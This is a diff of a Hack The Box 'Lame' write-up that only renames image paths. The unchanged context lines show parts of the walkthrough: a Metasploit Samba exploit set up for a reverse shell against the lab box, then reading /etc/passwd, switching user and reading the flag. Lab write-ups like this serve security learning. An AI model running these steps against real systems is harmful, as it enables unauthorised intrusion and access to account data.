@@ -1,6 +1,6 @@
 ---
 title: Lame machine HTB
-cover: ./lame-machine/Lame.png
+cover: ./lame-machine-img/Lame.png
 date: 2024-07-17T22:42:00+03:00
 draft: false
 ---
@@ -167,7 +167,7 @@ msfconsole
 msfconsole> search samba
 ~~~
 
-{{< image src="../../../lame-machine/1.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/1.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}
 
 ---
 
@@ -179,7 +179,7 @@ msfconsole> set RHOSTS 10.129.79.228
 msfconsole> set LHOST [Your IP]
 ~~~
 
-{{< image src="../../../lame-machine/2.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/2.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}
 
 Here, we're setting up the exploit with our target IP (RHOSTS) and our own IP (LHOST) for the reverse shell connection.
 
@@ -190,7 +190,7 @@ Run the exploit:
 msfconsole> run
 ~~~
 
-{{< image src="../../../lame-machine/3.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/3.png" alt="metasploit" position="center" style="border-radius: 8px;" >}}
 
 ---
 
@@ -206,7 +206,7 @@ Navigate to root directory:
 cd root
 ~~~
 
-{{< image src="../../../lame-machine/4.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/4.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
 
 ---
 
@@ -228,8 +228,8 @@ cat /etc/passwd
 
 >This file contains user account information.
 
-{{< image src="../../../lame-machine/5.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
-{{< image src="../../../lame-machine/6.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/5.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/6.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
 
 ---
 
@@ -239,7 +239,7 @@ Switch to user 'makis':
 su makis
 ~~~
 
-{{< image src="../../../lame-machine/7.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/7.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
 
 ---
 
@@ -249,7 +249,7 @@ Navigate to makis's home directory:
 cd 
 ~~~
 
-{{< image src="../../../lame-machine/8.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/8.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
 
 ---
 
@@ -259,7 +259,7 @@ Cat the user flag:
 cat user.txt
 ~~~
 
-{{< image src="../../../lame-machine/9.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
+{{< image src="../../../lame-machine-img/9.png" alt="reverse-shell" position="center" style="border-radius: 8px;" >}}
 
 ---
 
